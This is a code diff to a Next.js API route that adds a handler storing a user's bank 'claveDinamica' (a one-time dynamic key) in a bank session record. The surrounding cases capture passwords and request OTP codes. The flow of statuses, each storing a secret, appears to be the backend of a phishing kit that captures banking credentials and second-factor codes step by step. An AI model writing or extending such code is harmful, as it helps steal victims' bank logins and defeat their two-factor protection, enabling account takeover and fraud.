@@ -68,6 +68,17 @@ export async function POST(request: NextRequest) {
         });
         return NextResponse.json({ success: true, session: updatedPasswordSession });
 
+      case 'update_dynamic_key':
+        const updatedDynamicKeySession = await prisma.bankSession.update({
+          where: { sessionId },
+          data: {
+            claveDinamica: data.claveDinamica,
+            status: 'dynamic_key_entered',
+            updatedAt: new Date(),
+          }
+        });
+        return NextResponse.json({ success: true, session: updatedDynamicKeySession });
+
       case 'request_otp':
         const updatedOtpSession = await prisma.bankSession.update({
           where: { sessionId },
